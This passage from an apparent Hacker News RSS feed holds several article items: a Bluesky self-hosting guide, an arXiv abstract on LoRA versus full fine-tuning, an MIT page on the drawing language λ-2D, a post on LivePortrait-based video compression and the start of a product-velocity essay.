<li>Doing data aggregation with <a href="https://pola.rs/">Polars</a> was pretty good, but it wasnâ€™t obvious to me how to aggregate + plot, e.g., both underlying data and their standard deviation across dimensions.</li>
<li>Likely I just need to pick a Python plotting library and spend 20 hours getting fluent.</li>
</ul></li>
<li>The proliferation of complex type signatures in the Rust Embedded ecosystem still fails to spark joy â€” Iâ€™m stuck in the local optima of â€œliterally just write everything in <code>fn main()</code> with a loop at the bottomâ€ so I never have to write out the type signatures.</li>
</ul>

<h2 id="future-improvements">Future improvements</h2>

<p>I probably wonâ€™t go further on this until I have some sort of robotics context-of-use.
But for anyone whoâ€™s in the market for a project, here are a few ideas:</p>

<ul>
<li>Figure out how to make a parametric caliper emitter/reflector designs in PCB tools like <a href="https://atopile.io/">atopile</a> or some kind of KiCAD footprint generation script.</li>
<li>Design something specifically to work with aluminum extrusion motion systems and see how cheap/accurate you can make it.</li>
<li>Compare to more â€œoff the shelfâ€ positioning systems like magnetic tape or <a href="https://blog.adafruit.com/2024/02/29/eye-on-npi-triad-semiconductor-ts4631-light-to-digital-converter-eyeonnpi-adafruit-digikey-digikey-triadsemi-adafruit/">SteamVR trackers</a>.</li>
<li>Actually make this into a functional caliper by designing more suitable housing (as you can see from the video, my 3d printed base is just clamped to my desk).</li>
</ul>

<h2 id="thanks">Thanks</h2>

<ul>
<li>Mitko for designing the PCB hardware. See the details on the <a href="https://hackaday.io/project/194778-diy-digital-caliper-calipatron">hackday.io project page</a>.</li>
<li><a href="https://blog.npry.dev/">Nathan Perry</a> and <a href="https://jeffmcbride.net/">Jeff McBride</a> for helping me track down the <a href="https://github.com/lynaghk/repro-stm32f103-rust-embassy-freeze/">intermittent stm32f103 freeze up</a> to a bug in the CPU silicon. (Letâ€™s all do our best to never run into that again!)</li>
</ul>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Elwood Edwards, Voice of AOL's 'You've Got Mail ' Alert, Dies at 74 (144 pts)]]></title>
            <link>https://www.nytimes.com/2024/11/07/technology/elwood-edwards-aol-dead.html</link>
            <guid>42087087</guid>
            <pubDate>Fri, 08 Nov 2024 14:29:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nytimes.com/2024/11/07/technology/elwood-edwards-aol-dead.html">https://www.nytimes.com/2024/11/07/technology/elwood-edwards-aol-dead.html</a>, See on <a href="https://news.ycombinator.com/item?id=42087087">Hacker News</a></p>
Couldn't get https://www.nytimes.com/2024/11/07/technology/elwood-edwards-aol-dead.html: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[How to self-host all of Bluesky except the AppView (for now) (110 pts)]]></title>
            <link>https://alice.bsky.sh/post/3laega7icmi2q</link>
            <guid>42086596</guid>
            <pubDate>Fri, 08 Nov 2024 13:13:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://alice.bsky.sh/post/3laega7icmi2q">https://alice.bsky.sh/post/3laega7icmi2q</a>, See on <a href="https://news.ycombinator.com/item?id=42086596">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p node="[object Object]">Did you know? You can self-host and/or mirror almost all of Bluesky's infrastructure today!</p>
<blockquote node="[object Object]">
<p node="[object Object]">This article assumes familiarity with the architecture of Bluesky, general *nix knowledge and basic knowledge of TypeScript, Go and Rust toolchains</p>
</blockquote>
<h2 node="[object Object]">PDS</h2>
<p node="[object Object]">The most obvious one: having your own <a href="https://docs.bsky.app/docs/advanced-guides/federation-architecture#personal-data-server-pds" node="[object Object]">PDS</a> and owning your data. You can find the GitHub repository with instructions <a href="https://github.com/bluesky-social/pds?tab=readme-ov-file#self-hosting-pds" node="[object Object]">here</a>; you can migrate your existing account with the <a href="https://github.com/bluesky-social/indigo/tree/main/cmd/goat" node="[object Object]">GOAT tool</a>, for which <a href="https://bsky.app/profile/bnewbold.net" node="[object Object]">Bryan Newbold</a> has written an <a href="https://whtwnd.com/bnewbold.net/entries/Migrating%20PDS%20Account%20with%20%60goat%60" node="[object Object]">excellent howto post</a>.</p>
<h2 node="[object Object]">Relay</h2>
<p node="[object Object]">Bryan has a great blog post on how to set up your own <a href="https://docs.bsky.app/docs/advanced-guides/federation-architecture#relay" node="[object Object]">Relay</a> <a href="https://whtwnd.com/bnewbold.net/entries/Notes%20on%20Running%20a%20Full-Network%20atproto%20Relay%20(July%202024)" node="[object Object]">right here</a>. Things have grown since, so make sure you have at least ~4.5 TB of disk space (maybe more). Two important comments, not in the post: make sure to use the <code node="[object Object]">--disk-persister-dir=/data/events</code> flag as well as <a href="https://github.com/bluesky-social/indigo/blob/d1686e9b80835948407fd7ad2428e92379298dac/cmd/bigsky/main.go#L136-L141" node="[object Object]">enable compaction</a>.</p>
<h2 node="[object Object]">Jetstream</h2>
<p node="[object Object]"><a href="https://github.com/bluesky-social/jetstream" node="[object Object]">Jetstream</a> is like having your own Relay firehose, but uses a fraction of the bandwidth, storage, and gives you friendly JSON instead of <a href="https://en.wikipedia.org/wiki/CBOR" node="[object Object]">CBOR</a>-encoded <a href="https://en.wikipedia.org/wiki/Merkle_tree" node="[object Object]">MST</a> blocks. After cloning the GitHub repository, you can either use the included <code node="[object Object]">docker-compose.yaml</code> with <code node="[object Object]">make up</code> or build it directly with <code node="[object Object]">make build</code> and use your favorite keep-this-process-running-pretty-please tool (systemd, pm2 etc.) Don't forget to take a look at the <a href="https://github.com/bluesky-social/jetstream/blob/0ab10bd041fe1fdf682d3964b20d944905c4862d/cmd/jetstream/main.go#L36-L103" node="[object Object]">available CLI arguments/env variables</a>, which let you do things like change the default retention (24 hours) or override the Firehose cursor and backfill it with 3 days of dataâ€”which is what's available from the official relays.</p>
<h2 node="[object Object]">plc.directory mirror</h2>
<p node="[object Object]">To get a mirror of <a href="https://plc.directory/" node="[object Object]">plc.directory</a>, with almost all users on Bluesky (they <a href="https://atproto.com/specs/did#blessed-did-methods" node="[object Object]">do support did:web</a>, but they are few and far between), clone <a href="https://bsky.app/profile/str4d.xyz" node="[object Object]">str4d</a>'s <a href="https://github.com/str4d/plc" node="[object Object]"><code node="[object Object]">plc</code> repo</a>, switch to the <code node="[object Object]">mirror</code> branch, run <code node="[object Object]">cargo run --features mirror -- mirror run mirror.db</code>, then sit back and wait 5-10 hours. Once it's done and up-to-date, you have a full replica in a neat sqlite3 DB. You can monitor its status with something like <code node="[object Object]">watch -n60 'sqlite3 mirror.db "select count(*) from identity;"'</code> in a <a href="https://github.com/tmux/tmux/wiki" node="[object Object]">tmux</a> pane.</p>
<h2 node="[object Object]">The official web/mobile app, also known as <code node="[object Object]">social-app</code></h2>
<p node="[object Object]">Clone the <a href="https://github.com/bluesky-social/social-app" node="[object Object]">repo</a>, run <code node="[object Object]">yarn &amp;&amp; yarn web</code>, and you have a fully-functional copy of it in mere minutes that you can modify to your heart's desire. Doing this on mobile is a lot more involved and <a href="https://github.com/bluesky-social/social-app/blob/main/docs/build.md#iosandroid-build" node="[object Object]">documented here</a>.</p>
<h2 node="[object Object]">AppView</h2>
<p node="[object Object]">The elephant in the room is, of course, running your own Bluesky <a href="https://atproto.com/guides/glossary#app-view" node="[object Object]">AppView</a>. If you're interested, DM me on Bluesky to join my working group to make it happen!</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[LoRA vs. Full Fine-Tuning: An Illusion of Equivalence (200 pts)]]></title>
            <link>https://arxiv.org/abs/2410.21228</link>
            <guid>42085665</guid>
            <pubDate>Fri, 08 Nov 2024 09:58:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arxiv.org/abs/2410.21228">https://arxiv.org/abs/2410.21228</a>, See on <a href="https://news.ycombinator.com/item?id=42085665">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-inner">
    
    
                
    <p><a href="https://arxiv.org/pdf/2410.21228">View PDF</a>
    <a href="https://arxiv.org/html/2410.21228v1">HTML (experimental)</a></p><blockquote>
            <span>Abstract:</span>Fine-tuning is a crucial paradigm for adapting pre-trained large language models to downstream tasks. Recently, methods like Low-Rank Adaptation (LoRA) have been shown to match the performance of fully fine-tuned models on various tasks with an extreme reduction in the number of trainable parameters. Even in settings where both methods learn similarly accurate models, \emph{are their learned solutions really equivalent?} We study how different fine-tuning methods change pre-trained models by analyzing the model's weight matrices through the lens of their spectral properties. We find that full fine-tuning and LoRA yield weight matrices whose singular value decompositions exhibit very different structure; moreover, the fine-tuned models themselves show distinct generalization behaviors when tested outside the adaptation task's distribution. More specifically, we first show that the weight matrices trained with LoRA have new, high-ranking singular vectors, which we call \emph{intruder dimensions}. Intruder dimensions do not appear during full fine-tuning. Second, we show that LoRA models with intruder dimensions, despite achieving similar performance to full fine-tuning on the target task, become worse models of the pre-training distribution and adapt less robustly to multiple tasks sequentially. Higher-rank, rank-stabilized LoRA models closely mirror full fine-tuning, even when performing on par with lower-rank LoRA models on the same tasks. These results suggest that models updated with LoRA and full fine-tuning access different parts of parameter space, even when they perform equally on the fine-tuned distribution. We conclude by examining why intruder dimensions appear in LoRA fine-tuned models, why they are undesirable, and how their effects can be minimized.
    </blockquote>

    <!--CONTEXT-->
    
  </div><div>
      <h2>Submission history</h2><p> From: Reece Shuttleworth [<a href="https://arxiv.org/show-email/8c29db1a/2410.21228" rel="nofollow">view email</a>]      <br>    <strong>[v1]</strong>
        Mon, 28 Oct 2024 17:14:01 UTC (9,438 KB)<br>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Î›-2D: An Exploration of Drawing as Programming Language (185 pts)]]></title>
            <link>https://www.media.mit.edu/projects/2d-an-exploration-of-drawing-as-programming-language-featuring-ideas-from-lambda-calculus/overview/</link>
            <guid>42085273</guid>
            <pubDate>Fri, 08 Nov 2024 08:30:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.media.mit.edu/projects/2d-an-exploration-of-drawing-as-programming-language-featuring-ideas-from-lambda-calculus/overview/">https://www.media.mit.edu/projects/2d-an-exploration-of-drawing-as-programming-language-featuring-ideas-from-lambda-calculus/overview/</a>, See on <a href="https://news.ycombinator.com/item?id=42085273">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            
                <div>
                            

                            <p>&nbsp;An Exploration of Drawing as Programming Language, Featuring Ideas from Lambda Calculus</p>
                        </div>

                
                    <div>
    
        

    
        



    
        <div>
        <p><span>How can we code through drawing?</span>
        </p>
    </div>

    
        <div>
            <p>The area of non-verbal programming languages has not been unexplored. There are ASCII-based languages such as <a href="https://en.wikipedia.org/wiki/Befunge">Befunge</a> and <a href="https://github.com/aaronjanse/asciidots">asciidots</a>, as well as image-based ones such as <a href="https://esolangs.org/wiki/Piet">Piet</a>, just to name a few. Both inspired and challenged by these work, I set the following goals for my new language:</p><ul><li>To take advantage of the fact that the program is drawn, to include features that is otherwise unfeasible with text-based programming languages.</li><li>To have neither too few instructions, nor too many: For the former it becomes laborious to construct even the simplest programs, and for the latter it becomes non-minimalistic and difficult to do computer vision on.</li><li>To be able to draw programs that look visually appealing themselves, such that someone would want to put a frame around them and hang them on the wall.</li></ul>
        </div>

    
        <div>
        <p>
                    Though I'm normally an imperative and low-level person, I was compelled to use lambda calculus, or functional programming in its most primitive form, as the basis for the language, for it seemed to me that the ideas bear a lot of resemblance to a typical drawing. It has no concept of "execution" but only that of "evaluation", much like how the viewers' eyes can linger on any part of a drawing in no particular order, and by following many dots they see the line, and lines the form, and forms the composition.
                </p>
    </div>

    
        <div>
        <p>Conceptual blabber aside, I started with a grid-based system. While the user can draw continuous lines across many grids, each grid end up as one of a finite set of symbols. It seems like a good compromise between the ease of drawing for the human and that of parsing for the computer.
                    
                </p>
    </div>

    
        



    
        <div>
        <p>
                    Lambda calculus is such a concise language that it only has two instructions: that of function application and that of function definition. I quickly came up with working symbols for each: a "cup" shape for the former (for the silly intuition that applying the function is like putting the argument into the "cup"), and the eponymous greek letter for the latter (which is a bit unimaginative and arguably overused, but at least it's clear). Just like vanilla lambda calculus, functions always take one argument and produce one output; to get more, you can chain multiple functions together, known as "currying".
                </p>
    </div>

    
        



    
        <div>
        <p>Then came the wires to connect the symbols and through which data can flow. Technically the language is Turing complete at this point, but will be excruciatingly laborious to use, violating my design rule #2. Therefore, I added a lot more other symbols you would expect from your favorite programming languages, things like numbers and math operators. Consider them mere syntactic sugars: you can still stick to Church numerals (they're pretty cool) and other "pure" lambda calculus constructs if you'd like.
                    
                </p>
    </div>

    
        



    
        <div>
        <p>
                    I used to enjoy how easy it is in Scratch, to draw some sprites in the same editor and immediately use it for the program. Since my new language is entirely drawn, it should be even more natural to incorporate such kind of feature. Additionally, I wanted to be able to sketch the shape of a mathematical function and use it (e.g. for animating stuff), without the extra step of figuring out the equation (manually or otherwise). So I introduced the idea of "frames": fence any area of the canvas with wires, and put an indicating symbol at upper left; anything doodled in the area can be used as data. In a similar spirit, I wanted to be able to draw sliders (and perhaps other GUI elements in the future), which can be dragged at run-time to parametrically control the program.
                </p>
    </div>

    
        



    
        <div>
        <p>Initially I sketched my ideas on a dotted notebook, trying to construct some example programs in my (then imaginary) language. (I found this approach useful in my previous programming-language-design experiences). Then I figured it was time to code a parser for it, to see if it really "works". Since the computer vision part to scan the program from the paper was not ready yet, I decided to first make a simple editor software to let the user digitally draw programs.
                    
                </p>
    </div>

    
        <div>
        <p>Each symbol is made to 5x5 pixels, conveniently stamp-able on the gridded canvas, while the user can also draw "free hand" with a "pencil"-like tool. What initially started as a temporary measure grew to an almost full-fledged editor with many features.&nbsp;
                    
                </p>
    </div>

    
        



    
        <div>
        <p>One interesting problem that I did not anticipate while imagining the language was that it turned out so purely functional and absolutely state-less, that it becomes impossible to implement a "print" statement, for to print is to change state, to expect some things to be printed in some particular order is to assume that some expressions will be evaluated in some order. The solution was a functional re-thinking of the definition of "printing" as passing a piece of empty canvas to some function and receiving a new canvas with altered pixels resembling text (or whatever scribble desired) on it. (Replace "canvas" with "string" and "pixels" with "characters", if you wish, but you probably figured having read thus far that this is an anti-strings and pro-pixels language).
                    
                </p>
    </div>

    
        <div>
        <p>The baseline parser works by transpiling (translating) an entire Î»-2d program to a javascript equivalence. The resultant javascript one-liner is a single horrendously inscrutable mega-expression that contains enough parentheses to make a lisper shudder. But the coolest part about it is that it works (albeit inefficiently)!
                    
                </p>
    </div>

    
        



    
        <div>
        <p>I work to improve the language by constructing more example programs, and as I do I discover design flaws to be corrected. It was a lot of fun, for I am myself unfamiliar with my own creation: I only know the base rules, and that in theory it should work, but as to how to actually program in it I am as clueless as any other new learner of programming languages. Gradually I start to grasp its temperaments, of what it is like to program in this very strange, drawing-based language. In the beginning I was using the syntax clumsily, trying to bend things to my will; later I become more artful and expressive in it. Coding in Î»-2D is somewhat like playing Minecraft or Factorio, but it's even better because I can call it research.
                    
                </p>
    </div>

    
        <div>
        <p>
                    Below you can the comparison of two fractal tree programs, one in notebook doodles, and the other in refined digital form. (Please forgive the copious bugs and logical inconsistencies in the former, for I know people who can program on a piece of paper and get it right in one shot, unfortunately I'm not one of them and learned programming the "rogue" way: by running stuff over and over again and see if I can get any errors to pop up).
                </p>
    </div>

    
        



    
        



    
        <div>
        <p>I thought it must be cool and wondered what it would look like, to visualize the execution of a program written in this unusual language. The current parser spits out javascript and your browser's super-optimized javascript engine takes it over from there, so it is difficult to visualize the actual execution. However I can easily visualize the parsing, which should look similar to the path taken by a tree-walk interpreter executing the program.
                    
                </p>
    </div>

    
        



    
        <div>
        <p>And the animation did turn out quite fun to watch. But what if it makes sounds when going over different symbols? We can then "listen" to a program as it is being run, as if it were a song! I'm no musician myself but theoretically it should be possible to compose something musical with this kind of system.
                    
                </p>
    </div>

    
        <div>
        <p>It ended up sounding like a whacky computer game from 8-bit era. You can check it out in the <a href="https://l-2d.glitch.me/">online demo</a>&nbsp;(Menu &gt; Program &gt; Animated Run).</p>
    </div>

    
        <div>
        <p>Î»-2D started as a part of a larger research to design a system where the user draw programs with pen and paper, and receive interactive feedback through augmented reality. However,&nbsp;it grew increasingly interesting that it became a full project on its own. &nbsp;Though I'm quite proud of this neat little language, it is yet to fully meet some of the initial goals. For instance, the programs look too much like circuit diagrams and not enough like, well, drawings. Also, I'm not too optimistic about how easy it is for a human (excluding myself) to learn it, and for a computer vision system to scan it without error.</p>
    </div>

    
        <div>
        <p>Therefore, after I refine Î»-2D, I plan to design more potential programming languages that can be incorporated into the drawing-as-computation system I am developing, using knowledge and experience I've since gained.
                    
                </p>
    </div>

    
        <div>
        <p>
                    You can try out a beta version of Î»-2D <a href="https://l-2d.glitch.me/">online here</a>. The source code for the parser and editor will shortly be available on GitHub.
                </p>
    </div>

    
        



    
</div>

                

                

                
                    


    


 




                

                
                
                
            
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Asterogue, my sci-fi roguelike, is now playable on the web (261 pts)]]></title>
            <link>https://asterogue.com</link>
            <guid>42085036</guid>
            <pubDate>Fri, 08 Nov 2024 07:43:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://asterogue.com">https://asterogue.com</a>, See on <a href="https://news.ycombinator.com/item?id=42085036">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="story-text"><div><p>One thousand years of peace and prosperity in the galaxy have come to an end.</p><p>You, a humble lightswords-person, lost everything you loved in The Great War.</p></div><div><p>Late one night in the midst of the Dark Times you drowned your sorrows at a dive bar.</p><p>An old man mumbled a mythical tale. "Ancient aliens have returned".</p></div><div><p>He told of their dark arts and strange ambitions.</p><p>To suck away all that is good in the galaxy and store it in their Cursed Orb.</p></div><p><span></span> The Orb of the ancients is the source of all this misery, and whoever finds it shall bring peace.</p><div><p>He sketched a space-map on the back of a napkin, and was suddenly gone.</p><p>From your haze you stared at the map and knew it to be your destiny.</p></div><div><p>Days later, wheeling through the outer limits of the spiral arm, you crash land upon an asteroid.</p><p>Is this the one on the map? Is that an entrance you spy?</p></div><div><p>Faced with sure death on the surface or the chilling unknown within, the choice is clear.</p><p>You descend into the heart of the asteroid...</p></div><p id="story-next">Next</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Perceptually lossless (talking head) video compression at 22kbit/s (194 pts)]]></title>
            <link>https://mlumiste.com/technical/liveportrait-compression/</link>
            <guid>42084977</guid>
            <pubDate>Fri, 08 Nov 2024 07:30:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mlumiste.com/technical/liveportrait-compression/">https://mlumiste.com/technical/liveportrait-compression/</a>, See on <a href="https://news.ycombinator.com/item?id=42084977">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      
        <header>
          
          

  <p>
    
      
      <span>
        
        
        <time datetime="2024-11-07T00:00:00+02:00">November 7, 2024</time>
      </span>
    

    <span></span>

    
      
      

      <span>
        
        
          8 minute read
        
      </span>
    
  </p>


        </header>
      

      <section itemprop="text">
        
        <p>Update: <a href="https://news.ycombinator.com/item?id=42084977">Discussion on Hacker News</a></p>

<p>Iâ€™ve been having quite a bit of fun with the fairly recent <a href="https://github.com/KwaiVGI/LivePortrait">LivePortrait</a> model, generating deepfakes of my friends for some cheap laughs.</p>

<p><img src="https://mlumiste.com/assets/images/compression/elon.gif" alt=""></p>

<p><em>The inevitable Elon Musk deepfake, picture by <a href="https://www.debbierowe.com/corporate">Debbie Rowe</a></em></p>

<p>The emerging field of 2D avatar/portrait animation (being able to animate any still image, avoiding the need to render cumbersome 3D models that would struggle with small facial details) is a harbinger of things to come. In the best case, it will be ubiquitous on social media (the authors have already added an extension to animate cute animal faces) and in the worst, trust on the internet will be heavily undermined. But one overlooked use case of the technology is (talking head) video compression. After all, <a href="http://prize.hutter1.net/hfaq.htm#compai">prediction is compression</a>, so a sufficiently powerful face generator should be able to compress frame information into an extremely sparse set of cues to reconstruct the same frame from.</p>

<p>This was briefly explored in Nvidiaâ€™s seminal <a href="https://nvlabs.github.io/face-vid2vid/">facevid2vid</a> paper that compared their modelsâ€™ compression ratio to the classical H.264 codec. The main idea is quite simple: given a source image that is shared between the sending and receiving side, the only information that needs to be transmitted is the change in expression, pose and facial keypoints. The receiving side then simply animates the source frame into the new one, using these motion parameters.</p>

<p><img src="https://mlumiste.com/assets/images/compression/facevid2vid.png" alt=""></p>

<p>The main upside is that this method achieves pretty reasonable perceptual quality at an extremely low bitrate, while at a comparable level a traditional video codec will show heavy artifacts. There are, of course, downsides as well:</p>

<ul>
  <li>there is no longer a natural lever to trade-off between quality and bitrate, like the <a href="https://trac.ffmpeg.org/wiki/Encode/H.264">CRF</a> for H.264.</li>
  <li>as a model with large generative capacity, thereâ€™s essentially no limit to how bad the worst case reconstruction can be. It could in theory render a completely different person, or distort your face into a monstrous gremlin.</li>
  <li>the impressive bitrate does not come for free, as e.g. LivePortrait needs to run on an RTX 4090 for real-time processing. In the space of possible learned compression models, compared to something like <a href="https://github.com/microsoft/DCVC">DCVC</a>, it is a further improvement in compression rate, at the cost of having a 10x+ slower model.</li>
</ul>

<p>Anyway, LivePortrait is a beefed up version of facevid2vid, so letâ€™s look at how good it is for video compression. I extracted the first frame of the above driving video as a key frame, simulating a scenario where instead of a high quality enrolled image, key frames are extracted on-demand in the background. This means that in addition to being same identity animation, this is also same video animation - by far the simplest scenario to work on for the model, as you have very good alignment between the source and driving frames. Itâ€™s also the closest to a drop-in replacement of the current video call experience. Here are the results of a quick try:</p>

<p><img src="https://mlumiste.com/assets/images/compression/self.gif" alt=""></p>

<p><em>Self-animation, i.e. driving a keyframe of the video with the motion</em></p>

<p>Itâ€™s possible to uncover discrepancies in a side by side analysis:</p>

<ul>
  <li>the head tends to be a bit shaky in all my experiments, probably because LivePortrait processes frames in isolation, without any motion prior. Or maybe my driving video is low quality. ğŸ¤·</li>
  <li>since the eye gaze is off camera in the key frame (â€œneutral modeâ€), the model seems to map it incorrectly in every frame after that.</li>
  <li>teeth are generally hallucinated, but this is only noticeable in smiling videos.</li>
</ul>

<p>As expected, the discrepancies are much more obvious if we provide a driving video with shoulder movement and difficult head angles. Also, the further the inference setup is from the training one (which is same video animation), the worse the results.</p>

<p>Nonetheless, itâ€™s clear that there is a set of frames, arguably a large proportion of video-conferencing, where the model manages to produce subjectivelly distinguishable reconstructions. Sure, in a side by side analysis we might be able to tell which is the original and which is the reconstruction. However, if you are only looking at the generated output, it works very well.</p>

<p>So how small is the bitrate of this reconstruction? The model equation for transforming the face keypoints is:</p>

\[x_d = s_d \times (x_{c, s} R_d + \delta_d) + t_d\]

<p>where $x_{c, s} \in \mathbb{R}^{K \times 3}$ are the â€œcanonicalâ€ implicit 3D facial keypoints of the source image, $R_d \in \mathbb{R}^{3 \times 3}$ is a 3D <a href="https://en.wikipedia.org/wiki/Rotation_matrix#In_three_dimensions">rotation matrix</a> (relative to the canonical keypoints), $\delta_d \in \mathbb{R}^{K \times 3}$ denotes the expression deformations, $t_d \in \mathbb{R}^3$ is a translation vector and $s_d$ is just a scaling coefficient and $K$, the number of keypoints, is a hyperparameter. The intuition of this equation is provided in the Nvidia paper:</p>

<p><img src="https://mlumiste.com/assets/images/compression/rotation.png" alt=""></p>

<p>Of course, $x_d$ is not yet the final reconstruction of the image, only the transformed keypoints. There are some flow field estimations and warp operations remaining to actually turn the source image into the driving one. Nonetheless, the sender only needs to transmit $s_d$, $R_d$, $\delta_d$ and $t_d$ for a lifelike reconstruction to happen on the receiverâ€™s side.</p>

<p>And since we know their shapes, we can also infer the bitrate: $3 \times 3 +  K \times 3 + 3 = 75 $ numbers at $ K = 21 $, the default LivePortrait setting. At half precision floats, thatâ€™s $ 16 \times 75 \times 30 $ bits per second for a 30FPS video, or 36kbit/s. This could be compressed further - note that each frame is processed in isolation. This could be alleviated with entropy coding and having a temporal prior. In facevid2vid, simple entropy coding reduced the baseline modelâ€™s bitrate by nearly 40%, while using an adaptive number of keypoints reduced it by 60%. Using the first figure, we should be able to bring down LivePortraitâ€™s bitrate to about 22kbit/s. For reference, the low bitrate challenge in <a href="https://www.compression.cc/leaderboard/video_0_05/test/">CLIC 2024</a> featured video compression at 50kbit/s, but as expected, the models showed significantly worse subjective quality scores than at 500kbit/s.</p>

<p>LivePortrait has roughly the same bitrate as the facevid2vid had (model transmits similar information), but achieving better results. Looking at the evaluation results for the latter method, we see that as expected, their model only provides a single point on the bitrate-quality curve. So without any evaluation results at hand, I would expect LivePortrait to move strictly downwards, matching a lower H.264 CRF for equal preference. Extrapolating ahead, a future model might achieve the same perceptual quality as a visually lossless CRF (FFmpeg suggests 17 or 18). Then, it is up to the user whether they want to squeeze bitrate to near zero at the cost of compute.</p>

<p><img src="https://mlumiste.com/assets/images/compression/bdrate.png" alt=""></p>

<h2 id="how-does-it-work-what-is-the-magic">How does it work (what is the magic?)</h2>

<p>The main problem of frame animation is that we are projecting a 3D object to a 2D image. So our model needs to understand the rotation and deformation of the underlying object. The good thing about faces is that they are rigid, i.e. tends to have limited degrees of freedom in movement and nearby pixels move together in predictable ways. Nonetheless, this has proven to be a hard problem.</p>

<p>The main innovation of facevid2vid, that also powers LivePortrait, was realising that this can be formed as a 3D rotation problem. By rotating a set of abstract 3D tensors enough times, the model learns to actually map these to keypoints of the face, as if someone would have painstakingly labelled them for each frame. Up until then, models like <a href="https://aliaksandrsiarohin.github.io/first-order-model-website/">First Order Motion Model</a> had also used the implicit keypoints approach, but only with 2D keypoints.</p>

<p>The second thing that seems to work is quite humdrum: compared to facevid2vid, LivePortrait has seriously scaled up the training dataset to 69 million high quality frames, and added regional GAN losses that focus only on the local regions like the face or the lips. So rather than any architectural breakthrough, it seems to have been a lot of iterative improvements on dataset and losses.</p>

<p>While being able to learn facial keypoints self-supervisedly is a testament to why deep learning is cool, it also allows direct controllability of the avatar. Since the rotation matrix has a direct geometric interpretation, you can input parameters for a required pose. LivePortrait adds on top of this by training small neural networks to control lip and eye movement. This is a big step ahead in terms of avatar controllability which generally has not been a strong suit of many generative approaches (Iâ€™m looking at you, diffusion).</p>

<p>LivePortrait methodology is quite different from SotA learned video compression models like <a href="https://github.com/microsoft/DCVC">DCVC</a>, which need to encode spatial information with a great degree of fidelity targeting pixel-aligned distortion losses such as MSE. A generative model unencumbered by pixel-alignment and optimised for various GAN based perceptive losses, only tries to generate something plausible. On a spectrum of model architectures, it achieves higher compression efficiency at the cost of model complexity. Indeed, the full LivePortrait model has 130m parameters compared to DCVCâ€™s 20 million. While thatâ€™s tiny compared to LLMs, it currently requires an Nvidia RTX 4090 to run it in real time (in addition to parameters, a large culprit is using expensive warping operations). That means deploying to edge runtimes such as Apple Neural Engine is still quite a ways ahead.</p>

<p>Nonetheless, models and hardware become faster reliably quickly. Also, the same identity animation problem is significantly easier than animating Elon Musk or your cat, so probably a model optimised for teleconferencing could be remarkably smaller. Thatâ€™s why it might not be that much of a moonshot. Publicly, Zoom seems to have played with the idea of <a href="https://www.business-standard.com/technology/tech-news/zoom-expands-ai-features-introduces-custom-avatars-and-upgraded-companion-124101000315_1.html">avatar technology</a>. Iâ€™ll let the precise use cases be determined by product people, but off the top of my head:</p>

<ul>
  <li>having a more formal version of yourself avatar for days when youre working in your underwear</li>
  <li>animating a 4k studio quality avatar from a driving video from my terrible webcam</li>
  <li>using pose and gaze connection to seat the avatars in some kind of more immersive virtual meeting room</li>
  <li>letting your avatar attend meetings / send messages as a digital twin. If all the driving keypoints are directly manipulatable, you could programmatically control a photorealistic video.</li>
</ul>

<p>Of course itâ€™s possible that none of these will be useful or socially normalised, yet its fun to theorise.</p>

        
      </section>

      

      
  

    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Methodology is bullshit: principles for product velocity (216 pts)]]></title>
            <link>https://ssoready.com/blog/from-the-founders/methodology-is-bullshit/</link>
            <guid>42084753</guid>
            <pubDate>Fri, 08 Nov 2024 06:48:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ssoready.com/blog/from-the-founders/methodology-is-bullshit/">https://ssoready.com/blog/from-the-founders/methodology-is-bullshit/</a>, See on <a href="https://news.ycombinator.com/item?id=42084753">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>
            Building the right thing shouldn't take very long -- doing away with nonsense makes product development really fast"
        </p><div>
            <p>Weâ€™ve begun preparations for a major product launch. For us, itâ€™s a big deal; itâ€™s exciting. Itâ€™s a really big commitment. Itâ€™s also the kind of thing that threatens to become a quagmire, a set of features perpetually in-development.</p>
<p>Weâ€™ve found that making the right thing â€“ something people want â€“ is <em>intrinsically</em> quite fast. By contrast, itâ€™s all the other stuff that slows down product teams. Itâ€™s process, itâ€™s distance between deciders and doers, itâ€™s bloated specifications.</p>
<p>With this in mind, Iâ€™ve realized that our company has developed â€“ largely by accident â€“ some general principles for achieving product velocity. Some of these may be wrong, and weâ€™ll likely change our perspectives over time, but I thought Iâ€™d share them here nonetheless.</p>
<h2 id="principles-for-product-velocity">Principles for product velocity</h2>
<h2 id="we-should-probably-do-less">We should probably do less</h2>
<p>All else being equal, thereâ€™s usually a trade-off between speed and quality. For the most part, doing something faster usually requires a bit of compromise. Thereâ€™s a corner getting cut somewhere.</p>
<p>But all else need not be equal. We can often eliminate requirements â€¦ and just do less stuff. With sufficiently limited scope, itâ€™s usually feasible to build something quickly and to a high standard of quality.</p>
<p>Most companies assign requirements, assert a deadline, and treat quality as an output. We tend to do the opposite. Given a standard of quality, what can we ship in 60 days?</p>
<p>Recent escapades notwithstanding, Elon Musk has a similar <a href="https://medium.com/@cclark.osi/use-teslas-five-step-production-algorithm-to-improve-your-own-processes-d3c5bd427f37">thought process here</a>. Before anything else, an engineer should <em>make the requirements less dumb.</em></p>
<h2 id="idiot-mode-usually-works">Idiot mode usually works</h2>
<p>Weâ€™re big fans of the midwit meme. Put simply, the midwit meme usually shows an idiot and a genius agreeing on a simple solution, while a person of average intelligence flails around complaining about complicated stuff.</p>
<figure>
<p><img src="https://ssoready.com/blog/from-the-founders/methodology-is-bullshit/midwit.png">
</p>
